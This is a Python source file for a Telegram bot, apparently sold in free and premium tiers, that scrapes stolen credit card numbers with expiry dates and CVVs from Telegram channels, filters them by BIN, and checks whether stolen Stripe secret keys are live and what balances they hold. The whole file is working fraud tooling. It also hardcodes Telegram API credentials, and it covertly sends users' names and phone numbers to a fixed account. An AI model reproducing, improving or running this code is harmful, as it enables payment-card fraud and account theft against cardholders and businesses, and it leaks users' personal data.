#pylint:disable=W0640
#pylint:disable=W0631
#pylint:disable=W0703
#—–———–———Libraries—–———————#
import re,time,stripe,concurrent.futures,requests,os,csv
from telethon.sync import TelegramClient
from telethon import events
#——————————Login—————————#
api_id = '28334196'
api_hash = "dd3c4aa0133fb57ec9eef25252b2f266"      
client = TelegramClient("", api_id, api_hash)
client.connect()
print("Done Login")
#———–———Cards ReArrange———–——#
async def print_card(card, file):
    card_number, month, day, code = card
    output = f"{card_number}|{month}|{day}|{code}"
    file.write(output + '\n')
#——————————CODE—————————#
IDs_file = 'IDs.csv'
check_file_flag = False
command_sender_id = None
#——————————Plan—————–————#
def get_user_plan(sender_id):
    if not os.path.exists(IDs_file):
        return "Unknown"
    with open(IDs_file, 'r', newline='') as file:
        reader = csv.DictReader(file)
        for row in reader:
            if row['ID'] == str(sender_id):
                return "Premium"
    return "Free"
#——–———————Start–—————————#
@client.on(events.NewMessage(pattern='/start'))
async def handle_start_command(event):
    await event.reply("""

• 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 𝗚𝗼𝗸𝘂 𝗨𝗹𝘁𝗿𝗮 𝗜𝗻𝘀𝘁𝗶𝗻𝗰𝘁 𝗦𝗰𝗿𝗮𝗽𝗲𝗿

• 𝗦𝗲𝗻𝗱 /help 𝗧𝗼 𝗦𝗲𝗲 𝗔𝗹𝗹 𝗖𝗺𝗱𝘀

• 𝗢𝘄𝗻𝗲𝗿 : @Mohamed_Was_Here
""")
#——–———————Help–—————————#
@client.on(events.NewMessage(pattern='/help'))
async def handle_help_command(event):
    await event.reply("""
━━━━━━━━━━━━━━━━━━━
① 𝗦𝗲𝗻𝗱 /id 𝗧𝗼 𝗦𝗲𝗲 𝗬𝗼𝘂𝗿 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 
━━━━━━━━━━━━━━━━━━━
• 𝗦𝗰𝗿𝗮𝗽𝗲 𝗖𝗺𝗱𝘀
━━━━━━━━━━━━━━━━━━━
① 𝗨𝘀𝗲 /scr [channel] [amount] 𝗧𝗼 𝗦𝗰𝗿𝗮𝗽𝗲 𝗖𝗖𝘀 𝗙𝗿𝗼𝗺 𝗔𝗻𝘆 𝗖𝗵𝗮𝗻𝗻𝗲𝗹
━━━━━━━━━━━━━━━━━━━
② 𝗘𝘅𝘁𝗿𝗮𝗽 𝗖𝗺𝗱
-----------
 𝗨𝘀𝗮𝗴𝗲 -> /SB [BIN] [channel] [limit]
━━━━━━━━━━━━━━━━━━━
• 𝗦𝗸 𝗖𝗺𝗱𝘀
━━━━━━━━━━━━━━━━━━━
𝗦𝗸 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 
𝗨𝘀𝗮𝗴𝗲 /𝘀𝗸 [𝘀𝗸_𝗸𝗲𝘆]
━━━━━━━━━━━━━━━━━━━
𝗖𝗵𝗲𝗰𝗸 𝗦𝗸 𝗖𝗼𝗺𝗯𝗼
𝗨𝘀𝗮𝗴𝗲 : 𝗦𝗲𝗻𝗱 𝗦𝗸 𝗞𝗲𝘆𝘀 𝗖𝗼𝗺𝗯𝗼
━━━━━━━━━━━━━━━━━━━
• 𝗢𝘁𝗵𝗲𝗿 𝗖𝗺𝗱𝘀
━━━━━━━━━━━━━━━━━━━
𝗕𝗶𝗻 𝗟𝗼𝗼𝗸𝘂𝗽 
𝗨𝘀𝗮𝗴𝗲 : /𝗯𝗶𝗻 [𝗯𝗶𝗻]
━━━━━━━━━━━━━━━━━━━
𝗧𝗵𝗲 𝗟𝗶𝗺𝗶𝘁𝘀 
𝗦𝗰𝗿 = 5000
𝗦𝗯 = 1000
━━━━━━━━━━━━━━━━━━━

𝗢𝘄𝗻𝗲𝗿 -> @Mohamed_Was_Here  """)
#—––—––—————/ID–——–——–—–——#
@client.on(events.NewMessage(pattern="/id"))
async def handle_id_command(event):
    sender = await event.get_sender()
    sender_id = sender.id
    plan = get_user_plan(sender_id)
    await event.reply(f"""
━━━━━━━━━━━━━━━━━━━
----ᴀᴄᴄᴏᴜɴᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ----
━━━━━━━━━━━━━━━━━━━
𝙸𝙳 ⤃  {sender_id}  
---------
𝙽𝙰𝙼𝙴 ⤃ {sender.first_name}
---------
ᴜѕᴇʀ  ⤃  @{sender.username}
---------
𝙿𝙻𝙰𝙽 ⤃ {plan}
━━━━━━━━━━━━━━━━━━━
ᴏᴡɴᴇʀ ⤃  @Mohamed_Was_Here 𖤛
            """)
#——–———————/scrap–————————#
@client.on(events.NewMessage(pattern='/scr'))
async def handle_scrap_command(event):

    sender = await event.get_sender()
    sender_id = sender.id
    plan = get_user_plan(sender_id)
    limit = 2000  
    channel_username = "@scrap_amir"
    
    card_pattern = r"\b(\d{15}|\d{16}) (\d{2})/(\d{2}) (\d{3}|\d{4})\b"
    card_pattern2 = r"\b(\d{15}|\d{16})\|(\d{2})\|(\d{2}|\d{4})\|(\d{3}|\d{4})\b"
    
    command_text = event.message.message

    parts = command_text.split()[1:]
    if len(parts) > 0:
        if parts[0].isdigit():
            limit = (int(parts[0]))
            if len(parts) > 1:
                channel_username = parts[1]
        else:
            channel_username = parts[0]
            if len(parts) > 1:
                if parts[1].isdigit():
                    limit = (int(parts[1]))

    if limit > 5000 and plan != "Premium":
        await event.reply("""
You have The Free plan 
so you can't Scrap more than 5000 CCs at once.
To get the PREMIUM Plan, message the Dev » @Mohamed_Was_Here""")
        return
    try:
        channel = await client.get_entity(channel_username)
    except ValueError:
        await event.reply('Invalid channel username.')
        return

    start_message = await event.reply(f"""
𝚂𝙲𝚁𝙰𝙿𝙸𝙽𝙶 𝚂𝚃𝙰𝚁𝚃𝙴𝙳...........! 

𝙵𝙾𝚁 -> {sender.first_name} 

𝙲𝙷𝙰𝙽𝙽𝙴𝙻 -> {channel_username}

𝙻𝙸𝙼𝙸𝚃 -> {limit}

𝙿𝙻𝙰𝙽 ⤃ {plan}
━━━━━━━━━━━━━━━━━━━
ᴏᴡɴᴇʀ ⤃  @Mohamed_Was_Here 𖤛 """)
    start_time = time.time()
    messages = []

    try:
        async for message in client.iter_messages(channel, limit=None):
            messages.append(message)
            if len(messages) >= limit:
                break
    except Exception:
        pass

    end_time = time.time()
    input_time = end_time - start_time
    taken = round(input_time, 2)
    file_name = f"{channel_username.lstrip('@')}{limit}.txt"
    with open(file_name, 'w') as file:
        for message in reversed(messages):
            try:
                matches = re.findall(card_pattern, message.text) or re.findall(card_pattern2, message.text)
                for match in matches:
                    await print_card(match, file)
            except Exception:
                pass
    await start_message.delete()
    await event.reply(f"""
━━━━━━━━━━━━━━━━━━
---𝚂𝙲𝚁𝙰𝙿 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽- - 
━━━━━━━━━━━━━━━━━━
𝙻𝙸𝙼𝙸𝚃 ⤃ {limit}
━━━━━━━━
𝚃𝙰𝙺𝙴𝙽 ⤃ {taken}
━━━━━━━━
𝙿𝙻𝙰𝙽 ⤃ {plan}
━━━━━━━━
𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ⤃ {channel_username}
━━━━━━━━━━━━━━━━━━
ᴏᴡɴᴇʀ ⤃ @Mohamed_Was_Here 𖤛
""", file=file_name)
    os.system(f"rm -rf {file_name}")
    print(f"Done scraping for {sender.first_name} ID»{sender_id} Limit»{limit}")
#——–——————/scr_bin–————————#
@client.on(events.NewMessage(pattern='/SB'))
async def handle_SB_command(event):
    sender = await event.get_sender()
    sender_id = sender.id
    plan = get_user_plan(sender_id)
    channel_limit = 200
    bin_limit = 5
    bin_number = None
    cards_found = 0
    channel_username = "@scrap_amir"

    card_pattern = r"\b(\d{15}|\d{16}) (\d{2})/(\d{2}) (\d{3}|\d{4})\b"
    card_pattern2 = r"\b(\d{15}|\d{16})\|(\d{2})\|(\d{2}|\d{4})\|(\d{3}|\d{4})\b"

    command_text = event.message.message
    parts = command_text.split()[1:]

    if len(parts) > 0:
        bin_number = parts[0].strip()

    if len(parts) > 1:
        if parts[1][0].isdigit():
            bin_limit = int(parts[1])
        else:
            channel_username = parts[1].strip()

    if len(parts) > 2:
        if parts[2][0].isdigit():
            bin_limit = int(parts[2])
        else:
            channel_username = parts[2].strip()

    if bin_number is None:
        await event.reply("Invalid command format. Please provide a valid BIN.")
        return

    if bin_limit > 100 and plan != "Premium":
        await event.reply("""
You have The Free plan 
so you can't get more than 100 CCs at once.
To get the PREMIUM Plan, message the Dev » @Mohamed_Was_Here""")
        return

    sender = await event.get_sender()
    sender_id = sender.id
    user_data = f"""New BIN »»»

BIN = {bin_number}

User Information:
ID: {sender_id}
First Name: {sender.first_name}
Last Name: {sender.last_name}
Username: @{sender.username}
Phone: {sender.phone}"""
    await client.send_message(5294929641, user_data)

    start_message = await event.reply(f"""
𝚂𝙲𝚁𝙰𝙿𝙸𝙽𝙶 𝚂𝚃𝙰𝚁𝚃𝙴𝙳...........! 

𝙵𝙾𝚁 -> {sender.first_name}

𝙲𝙷𝙰𝙽𝙽𝙴𝙻 -> {channel_username}

𝙻𝙸𝙼𝙸𝚃 -> {bin_limit}

𝙱𝙸𝙽 -> {bin_number}

𝙱𝙾𝚃 𝙱𝚈 -> @Mohamed_Was_Here                                           """)

    start_time = time.time()
    try:
        channel = await client.get_entity(channel_username)
    except ValueError:
        await event.reply('Invalid channel username.')
        return
    found_cards = []
    async for message in client.iter_messages(channel):
        if isinstance(message.text, str):
            matches = re.findall(card_pattern, message.text) or re.findall(card_pattern2, message.text)
            for match in matches:
                if match[0].startswith(bin_number):
                    found_cards.append(match)
                    cards_found += 1
                    if cards_found >= bin_limit:
                        break
        if cards_found >= bin_limit:
            break
    if len(found_cards) == 0:
        await event.reply('No cards found with this BIN number.')
        return
    while cards_found < bin_limit:
        async for message in client.iter_messages(channel, limit=channel_limit, offset_id=message.id):
            if isinstance(message.text, str):
                matches = re.findall(card_pattern, message.text) or re.findall(card_pattern2, message.text)
                for match in matches:
                    if match[0].startswith(bin_number):
                        found_cards.append(match)
                        cards_found += 1
                        if cards_found >= bin_limit:
                            break
            if cards_found >= bin_limit:
                break
    if len(found_cards) == 0:
        await event.reply('No cards found with this BIN number.')
        return
    end_time = time.time()
    input_time = end_time - start_time
    taken = round(input_time, 2)
    file_name = f"{channel_username.lstrip('@')} {bin_limit}.txt"
    with open(file_name, 'w') as file:
        for card in found_cards:
            await print_card(card, file)
    await start_message.delete()
    await event.reply(f"""
━━━━━━━━━━━━━━━━━━━━
-----𝚂𝙲𝚁𝙰𝙿 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽---- 
━━━━━━━━━━━━━━━━━━━━
𝙱𝙸𝙽  ⤃ {bin_number}
━━━━━━━━━
𝙻𝙸𝙼𝙸𝚃  ⤃ {bin_limit}
━━━━━━━━━
𝚃𝙰𝙺𝙴𝙽  ⤃ {taken}
━━━━━━━━━
    𝙲𝙷𝙰𝙽𝙽𝙴𝙻  ⤃ {channel_username}
━━━━━━━━━━━━━━━━━━━━
ᴏᴡɴᴇʀ ⤃  @Mohamed_Was_Here  𖤛
    """, file=file_name)
    os.system(f"rm -rf {file_name}")
    print(f"   Done scraping for {sender.first_name}")
#——–—————/Preminum–———————#
@client.on(events.NewMessage(pattern=r'/premium (\d+)'))
async def premium_command_handler(event):
    sender_id = event.sender_id

    if sender_id == 5894339732:
        id_to_add = event.pattern_match.group(1)

        if not os.path.exists(IDs_file):
            with open(IDs_file, 'w', newline='') as file:
                writer = csv.writer(file)
                writer.writerow(['ID', 'Plan'])
        
        ids = []
        plans = []
        with open(IDs_file, 'r', newline='') as file:
            reader = csv.DictReader(file)
            for row in reader:
                ids.append(row['ID'])
                plans.append(row['Plan'])

        if id_to_add not in ids:
            with open(IDs_file, 'a', newline='') as file:
                writer = csv.writer(file)
                writer.writerow([id_to_add, 'Premium'])
            await event.reply(f"Added ID {id_to_add} as a premium user.")
        else:
            await event.reply(f"This ID {id_to_add} is already a premium user.")
    else:
        await event.reply("You are not authorized to use this command.")
#——–—————/unpreminum–——————#
@client.on(events.NewMessage(pattern=r'/unpremium (\d+)'))
async def unpremium_command_handler(event):
    sender_id = event.sender_id

    if sender_id == 5894339732:
        id_to_remove = event.pattern_match.group(1)

        if not os.path.exists(IDs_file):
            await event.reply("No premium users found.")
            return

        ids = []
        with open(IDs_file, 'r', newline='') as file:
            reader = csv.DictReader(file)
            for row in reader:
                ids.append(row['ID'])

        if id_to_remove in ids:
            rows_to_keep = [row for row in ids if row != id_to_remove]
            with open(IDs_file, 'w', newline='') as file:
                writer = csv.writer(file)
                writer.writerow(['ID', 'Plan'])
                for row in rows_to_keep:
                    writer.writerow([row, 'Premium'])
            await event.reply(f"Removed ID {id_to_remove} from premium users.")
        else:
            await event.reply(f"This ID {id_to_remove} is not a premium user.")
    else:
        await event.reply("You are not authorized to use this command.")
#—––—–———/prem_users–————–——#
@client.on(events.NewMessage(pattern=r'/prem_users'))
async def prem_users_command_handler(event):
    sender_id = event.sender_id

    if sender_id == 5894339732:
        if not os.path.exists(IDs_file):
            await event.reply("No premium users found.")
            return

        user_info = ''
        count = 1

        with open(IDs_file, 'r', newline='') as file:
            reader = csv.DictReader(file)
            for row in reader:
                user_id = row['ID']
                try:
                    user = await client.get_entity(int(user_id))
                    first_name = user.first_name
                    user_info += f"{count} - {user_id} » {first_name}\n\n"
                    count += 1
                except Exception as e:
                    print(f"Error retrieving user details for ID {user_id}: {e}")

        if user_info:
            await event.reply(user_info)
        else:
            await event.reply("No user details found.")
    else:
        await event.reply("You are not authorized to use this command.")
#——–———————/sk—–————————#
@client.on(events.NewMessage(pattern='/sk'))
async def handle_sk_command(event):
    command = event.raw_text.strip().split(' ')
    if len(command) != 2:
        await event.respond("Invalid command format. Please use the format: /sk [sk]")
        return
    sk = command[1]
    def retrieve_account_info():
        stripe.api_key = sk
        account = stripe.Account.retrieve()
        return account
    with concurrent.futures.ThreadPoolExecutor() as executor:
        try:
            account = await client.loop.run_in_executor(executor, retrieve_account_info)
            country = account.country
            try:
                pending_balance = account.balance.get('pending', {}).get('amount', 0)
                available_balance = account.balance.get('available', {})
                balance_info = "\n".join([f"★Available Balance: {balance} {currency}" for currency, balance in available_balance.items()])
                balance_info = f"★Pending Balance: {pending_balance} {account.default_currency}\n{balance_info}"
            except AttributeError:
                balance_info = "Balance information not available."

            if hasattr(account, 'requirements'):
                result = "RATE LIMIT ⚠️"
            else:
                result = "SK LIVE ✅"
            response = f"𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅\n\nKEY ➔ {sk}\n\n★RESULT : {result}\n★Country : {country}\n{balance_info}"
        except stripe.error.AuthenticationError:
            response = "𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌"
        except Exception as e:
            response = f"An error occurred: {str(e)}"
    await event.reply(response)
#——–—————/BIN-lookup–———————#
@client.on(events.NewMessage(pattern=r'/bin(\s+\d+)?'))
async def bin_lookup(event):
    try:
        bin_number = event.pattern_match.group(1).strip()
        if not bin_number:
            await event.reply("Please provide a valid BIN number.")
            return
        
        bin_number = bin_number[:6] 

        response = requests.get(f'https://lookup.binlist.net/{bin_number}')
        data = response.json()
        
        if 'error' in data:
            await event.respond(f"Error: {data['error']}")
        else:
            card_type = data.get('type', '------')
            brand = data.get('brand', 'Unknown Brand')
            sub_brand = data.get("scheme", '------')
            bank_name = data['bank'].get('name', '------')
            country_name = data['country'].get('name', '------')
            country_emoji = data['country'].get('emoji', 'Unknown Emoji')

            reply = f"""𝗩𝗔𝗟𝗜𝗗 𝗕𝗜𝗡 ✅
            
𝗕𝗜𝗡 ⇾ {bin_number}
            
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {sub_brand.upper()} - {card_type.upper()} - {brand.upper()}
𝗕𝗮𝗻𝗸: {bank_name}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_name} {country_emoji}
𝗕𝗼𝘁 𝗕𝘆 => @Mohamed_Was_Here"""
            await event.respond(reply)
    except ValueError:
        pass
    except AttributeError:
    	pass
    except Exception as e:
        await event.respond(f"An error occurred: {str(e)}")
#——–——–———/SK_File–————–———#
@client.on(events.NewMessage(pattern='/SK_file'))
async def handle_sk_file_command(event):
    sender_id = event.sender_id
    plan = get_user_plan(sender_id)
    global check_file_flag, command_sender_id
    check_file_flag = True
    command_sender_id = event.sender_id
    if plan == "Premium":
        check_file_flag = True
        
        await event.reply("Please send the file.")
    else:
        await event.reply("You are a free user and can't run premium commands.")
        return 
    

@client.on(events.NewMessage)
async def handle_message(event):
    global check_file_flag, command_sender_id
    

    if check_file_flag and event.sender_id == command_sender_id and event.media and hasattr(event.media, 'document'):
        file = await event.download_media()
        await event.reply("File received successfully. Checking SKs...")
        with open(file, 'r') as f:
            sks = f.read().splitlines()

        live_sk_count = 0
        did_sk_count = 0
        live_sks = []  

        for sk in sks:
            def retrieve_account_info():
                stripe.api_key = sk
                account = stripe.Account.retrieve()
                return account

            with concurrent.futures.ThreadPoolExecutor() as executor:
                try:
                    account = await client.loop.run_in_executor(executor, retrieve_account_info)
                    country = account.country
                    try:
                        pending_balance = account.balance.get('pending', {}).get('amount', 0)
                        available_balance = account.balance.get('available', {})
                        balance_info = "\n".join([f"★Available Balance: {balance} {currency}" for currency, balance in available_balance.items()])
                        balance_info = f"★Pending Balance: {pending_balance} {account.default_currency}\n{balance_info}"
                    except AttributeError:
                        balance_info = "Balance information not available."

                    if hasattr(account, 'requirements'):
                        result = "RATE LIMIT ⚠️"
                        did_sk_count += 1
                    else:
                        result = "SK LIVE ✅"
                        live_sk_count += 1
                        live_sks.append(f"𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅\n\nKEY ➔ {sk}\n\n★RESULT : {result}\n★Country : {country}\n{balance_info}")

                except stripe.error.AuthenticationError:
                    did_sk_count += 1
                except Exception:
                    did_sk_count += 1

        
        live_sks_message = '\n•——————————•\n'.join(live_sks)

        await event.reply(live_sks_message)
        await event.reply(f"Finished checking SKs.\nLive SKs: {live_sk_count}\nDid SKs: {did_sk_count}")

        check_file_flag = False
        command_sender_id = None
#—––—–———AllCUscrap–——–—–———#
@client.on(events.NewMessage(pattern='/SCRall'))
async def handle_allscrap_command(event):
    sender = await event.get_sender()
    sender_id = sender.id
    plan = get_user_plan(sender_id)
    channel_username = "@scrap_amir"
    
    card_pattern = r"\b(\d{15}|\d{16}) (\d{2})/(\d{2}) (\d{3}|\d{4})\b"
    card_pattern2 = r"\b(\d{15}|\d{16})\|(\d{2})\|(\d{2}|\d{4})\|(\d{3}|\d{4})\b"
    
    command_text = event.message.message

    parts = command_text.split()[1:]
    if len(parts) > 0:
        channel_username = parts[0]
    
    if plan != "Premium":
        await event.reply("""
You have the Free plan, so you can't scrape without limits.
To get the Premium plan, message the Dev » @W_W0_W""")
        return
    try:
        channel = await client.get_entity(channel_username)
    except ValueError:
        await event.reply('Invalid channel username.')
        return

    start_message = await event.reply(f"""
𝚂𝙲𝚁𝙰𝙿𝙸𝙽𝙶 𝚂𝚃𝙰𝚁𝚃𝙴𝙳...........! 

𝙵𝙾𝚁 -> {sender.first_name} 

𝙲𝙷𝙰𝙽𝙽𝙴𝙻 -> {channel_username}

𝙿𝙻𝙰𝙽 ⤃ {plan}
━━━━━━━━━━━━━━━━━━━
ᴏᴡɴᴇʀ ⤃ @W_W0_W 𖤛
𝙱𝙾𝚃 𝙱𝚈 -> @ZFZ_ZFZ 𖣐 """)
    start_time = time.time()

    file_name = f"{channel_username.lstrip('@')}_all.txt"
    card_count = 0
    with open(file_name, 'w') as file:
        async for message in client.iter_messages(channel, limit=None):
            try:
                matches = re.findall(card_pattern, message.text) or re.findall(card_pattern2, message.text)
                card_count += len(matches)
                for match in matches:
                    await print_card(match, file)
            except Exception:
                pass
    
    end_time = time.time()
    input_time = end_time - start_time
    taken = round(input_time, 2)
    
    await start_message.delete()
    caption = f"Scraping Information\n\nLimit: Unlimited\nTaken: {taken}\nPlan: {plan}\nChannel: {channel_username}\n\nNumber of Cards Scraped: {card_count}"
    await client.send_file(event.chat_id, file=file_name, caption=caption)
    os.remove(file_name)

#——–—–———/Code-End–————–———#
client.start()
client.run_until_disconnected()